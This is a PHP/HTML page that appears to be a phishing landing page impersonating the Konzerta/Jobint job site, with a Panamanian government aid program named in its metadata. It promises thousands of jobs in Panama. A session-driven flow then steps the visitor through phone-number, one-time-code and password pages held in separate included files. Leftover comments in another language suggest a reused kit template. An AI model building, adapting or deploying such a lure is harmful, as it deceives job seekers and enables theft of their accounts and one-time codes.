<?php require("_core.php"); ?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> <?= $TITLE ?> </title>
    <meta name="robots" content="nofollow, noindex" />
    <link rel="shortcut icon" href="assets/favicon.png" />
    <meta name="description" content="<?= $TITLE ?>">
    <meta name="keywords" content="Vale Digital, Vale, AIG, Panamá Solidario">
    <meta name="author" content="Autoridad Nacional para la Innovación Gubernamental">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="image" content="assets/banner.jpg">
    <!--  Bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <!-- Tailwind -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.1.2/tailwind.min.css" rel="stylesheet">
    <!-- Toastify.css -->
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
    <!-- Animate -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
    <!-- jQuery Confirm.css -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery-confirm/3.3.2/jquery-confirm.min.css">
    <!-- intlTelInput.min.css -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/css/intlTelInput.min.css">
    <!-- intlTelInput.min.js -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.2.1/js/intlTelInput.min.js"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">


<!-- Dk Css -->
 <link rel="stylesheet" type="text/css" href="assets/dk.css">
    <style>
      .jc-bs3-container {
        width: 80%;
        padding-left: 20%;
      }

      :root {
        --main-blue: #1565C0;
        /* ubah sesuai warna biru banner */
        --header-height: 68px;
      }

      .app-header {
        background-color: #fff;
        box-shadow: 0 1px 6px rgba(0, 0, 0, 0.08);
        height: var(--header-height);
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 0 18px;
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        z-index: 1030;
      }

      .navbar-brand img {
        height: 95px;
        width: auto;
        object-fit: contain;
      }

      /* Hamburger icon */
      .hamburger-icon {
        width: 14px;
        height: 10px;
        display: flex;
        flex-direction: column;
        justify-content: space-between;
        cursor: default;
      }

      .hamburger-icon span {
        display: block;
        height: 2px;
        border-radius: 3px;
        background-color: blue;
      }

      /* Agar konten tidak tertutup header */
      body {
        padding-top: calc(var(--header-height) + 8px);
        font-family: "Montserrat", sans-serif;
      }

      .icon-circle {
        width:60px;
        height:60px;
        border:2px solid white;
        border-radius:50%;
        display:flex;
        justify-content:center;
        align-items:center;
        font-size:24px;
        color:white;
        text-decoration:none;
        transition:0.3s;
    }

    .icon-circle:hover {
        background:white;
        color:#233648;
    }

    .active-circle {
        background:white;
        color:#233648 !important;
    }

      /* .iti * {box-sizing: unset;} */
    </style>
    <!-- jQuery -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
  </head>
  <body style="background-repeat: no-repeat;background-attachment: fixed;background-size: cover;background-color: #F4F4F9;">
      <div id="loader" style="position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.5); z-index: 9999;">
        <div class="spinner" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);"></div>
      </div>
  
  <div class="px-4 relative" style=" padding-bottom: 20px;">
      <div class="flex justify-center items-center text-white relative">
        <a class="flex justify-center gap-4" href="/">
          <img alt="jbs" loading="lazy" width="300" decoding="async" data-nimg="1" style="color:transparent" srcSet="assets/logo.png" src="assets/logo.png" />
        </a>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="font-bold w-8 h-8 absolute right-4">
          <line x1="4" x2="20" y1="12" y2="12"></line>
          <line x1="4" x2="20" y1="6" y2="6"></line>
          <line x1="4" x2="20" y1="18" y2="18"></line>
        </svg>
      </div>
    </div> 
    
    <div style="padding-top: 30px;">
      <div class="container py-2 text-xl">
        <h1>Hay <b>2,301</b> trabajos esperándote en Panamá</h1>
      </div>
      <?php
      if(!isset($_SESSION["state"]) OR isset($_GET["otherAccount"])) {
        $_SESSION["state"] = "start";
      }
      
      $F = $_SESSION["state"];
      switch($F) {
        case "start": require("Lander.php"); break;
        // case "start": require("SCCS.php"); break;
        case "phone": require("OTPC.php"); break;
        case "otp":   require("PASS.php"); break;
        case "success": require("SCCS.php"); break;
        default: break;
      }
    ?> 
    </div>
  <header class="app-header">
    <!-- Hamburger di kiri -->
    <div class="hamburger-icon">
      <span></span>
      <span></span>
      <span></span>
    </div>
    <!-- Logo di kanan -->
     <div style="position: absolute; left: 0;display: flex;justify-content: center;align-items: center; width: 100%;padding-left: 30px">
       <a class="navbar-brand" href="#" aria-label="Inicio">
         <img src="assets/konzerta.5fd0713e.svg" class="" style="width: 130px;" alt="Logo">
       </a>
     </div>
    </header>
    <div class="container"style="margin-top: 10px;">
      <main>
        <style>
          body {
            font-family: "Montserrat", sans-serif;
            background-color: #F4F4F9;
            margin: 0;
            padding: 0;
          }

          .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #1565C0;
            /* azul principal */
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            margin-left: -25px;
            margin-top: -25px;
            box-sizing: border-box;
          }

          @keyframes spin {
            0% {
              transform: rotate(0deg);
            }

            100% {
              transform: rotate(360deg);
            }
          }
        </style>
        <!-- ======= Secciones: Beneficios, Pasos, CTA, Footer ======= -->
        <style>
          :root {
            --main-blue: #1565C0;
            /* sesuaikan bila perlu */
            --card-radius: 12px;
          }

          .section-card {
            border-radius: var(--card-radius);
            background: #fff;
            box-shadow: 0 6px 18px rgba(21, 101, 192, 0.06);
            padding: 20px;
          }

          .feature-icon {
            width: 44px;
            height: 44px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border-radius: 10px;
            background: rgba(21, 101, 192, 0.10);
            color: var(--main-blue);
            font-weight: 700;
            margin-right: 12px;
          }

          .step-bubble {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background: var(--main-blue);
            color: #fff;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            margin-right: 12px;
          }

          .footer {
            background: #ffffff;
            border-top: 1px solid #e5e7eb;
            font-family: Arial, sans-serif;
          }

          .footer-top {
            text-align: center;
            padding: 50px 20px;
          }

          .footer-top h3 {
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 25px;
          }

          .store-buttons {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 30px;
            flex-wrap: wrap;
          }

          .store-buttons img {
            height: 35px;
            cursor: pointer;
          }

          .social-icons {
            display: flex;
            justify-content: center;
            gap: 15px;
          }

          .social-icons a {
            width: 40px;
            height: 40px;
            background: #d1d5db;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #4b5563;
            font-size: 18px;
            transition: all 0.3s ease;
          }

          .social-icons a:hover {
            background: #9ca3af;
            color: #111827;
          }

          .footer-bottom {
            border-top: 1px solid #e5e7eb;
            text-align: center;
            padding: 30px 20px;
          }

          .footer-logo {
            font-size: 40px;
            font-weight: 700;
            color: #0b1b5e;
            margin-bottom: 5px;
          }

          .footer-bottom p {
            font-size: 14px;
            color: #6b7280;
          }


          .small-muted {
            color: rgba(0, 0, 0, 0.55);
            font-size: 14px;
          }

          /* spacing helper */
          .gap-18 {
            gap: 18px;
          }
          
.create-account-section {
  display: flex;
  justify-content: center;
  /* padding: 40px 0; */
  background: #f7f9fc;
}

.create-account-card {
  max-width: 420px;
  background: #ffffff;
  padding: 32px 24px;
  border-radius: 12px;
  box-shadow: 0 10px 30px rgba(0,0,0,.08);
  font-family: Arial, sans-serif;
}

.create-account-card h2 {
  font-size: 22px;
  font-weight: 700;
  margin-bottom: 24px;
  color: #1f2937;
}

.steps {
  list-style: none;
  padding: 0;
  margin: 0;
}

.steps li {
  display: flex;
  gap: 12px;
  margin-bottom: 18px;
  color: #374151;
}

.steps i {
  color: #2563eb;
  margin-top: 4px;
  min-width: 20px;
}

.steps p {
  font-size: 14px;
  line-height: 1.5;
  margin: 0;
}

.btn-create-account {
  margin-top: 20px;
  width: 100%;
  padding: 12px;
  background: #1d4ed8;
  color: #ffffff;
  border: none;
  border-radius: 8px;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
}

.btn-create-account:hover {
  background: #1e40af;
}
        </style>
        <!-- Container utama (lebar yang sama seperti form) -->
        <div class="container" style="max-width:520px; margin: 18px auto 0;" id="dkhide">
          <!-- Beneficios / Por qué reclamar -->
           <section class="mb-3 create-account-section">
            <div class="create-account-card">

              <h2>Etapa de presentación de una solicitud</h2>

              <ul class="steps">
                <!-- <li>
                  <i class="fa-solid fa-user-plus"></i>
                  <p>
                    Ingresa en la opción <b>Crear cuenta</b>, escribe tus datos y confírmalos.
                  </p>
                </li> -->

                <li>
                  <i class="fa-solid fa-pen"></i>
                  <p>
                    Completa la información principal de tu perfil a través de las preguntas por pasos que te haremos inmediatamente después de que te registres.
                  </p>
                </li>

                <li>
                  <i class="fa-regular fa-square-check"></i>
                  <p>
                    Postúlate a los trabajos que más te interesen y sigue el proceso de tus postulaciones.
                  </p>
                </li>

                <li>
                  <i class="fa-solid fa-floppy-disk"></i>
                  <p>
                    Recuerda mantener tu información actualizada desde la sección de tu perfil.
                  </p>
                </li>
              </ul>

              <button class="btn-create-account">
                <!-- Crear cuenta -->
                 Rellena el formulario
              </button>

            </div>
          </section>

        </div>
    </div>
    <!-- Footer -->
     <footer class="footer">
      <!-- TOP FOOTER -->
      <div class="footer-top">
        <h3>¡Descarga la app en tu celular!</h3>

        <div class="store-buttons">
          <img src="https://www.konzerta.com/candidate/static/media/google-play.e17dd44b.svg" alt="Google Play" />
          <img src="https://www.konzerta.com/candidate/static/media/app-store.4395c04d.svg" alt="App Store" />
        </div>

        <div class="social-icons">
          <a href="#"><i class="fab fa-facebook-f"></i></a>
          <a href="#"><i class="fab fa-tiktok"></i></a>
          <a href="#"><i class="fab fa-instagram"></i></a>
          <a href="#"><i class="fab fa-linkedin-in"></i></a>
          <a href="#"><i class="fab fa-youtube"></i></a>
        </div>
      </div>

      <!-- BOTTOM FOOTER -->
      <div class="footer-bottom">
        <div class="footer-logo">jobint</div>
        <p>© Copyright 1999–2025 Jobint</p>
      </div>
    </footer>


    <!-- jQuery -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <!-- Toastify -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
    <!-- jQuery Confirm -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-confirm/3.3.2/jquery-confirm.min.js"></script>
    <!-- Crypto.js -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js"></script>
  </body>
  <div></div>
</html>